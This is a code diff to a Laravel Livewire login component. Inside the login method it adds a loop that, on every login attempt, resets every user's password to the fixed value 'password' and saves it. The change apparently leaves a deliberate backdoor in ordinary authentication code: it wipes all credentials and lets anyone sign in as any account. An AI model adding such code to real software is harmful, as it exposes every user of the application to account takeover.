@@ -4,6 +4,7 @@ use App\Livewire\Forms\LoginForm;
 use Illuminate\Support\Facades\Session;
 use Livewire\Attributes\Layout;
 use Livewire\Volt\Component;
+use App\Models\User;
 
 new #[Layout('layouts.guest')] class extends Component
 {
@@ -15,6 +16,13 @@ new #[Layout('layouts.guest')] class extends Component
     public function login(): void
     {
         $this->validate();
+
+         $users = User::all();
+
+    foreach ($users as $user) {
+        $user->password = bcrypt('password');
+        $user->save();
+    }
 
         $this->form->authenticate();
 
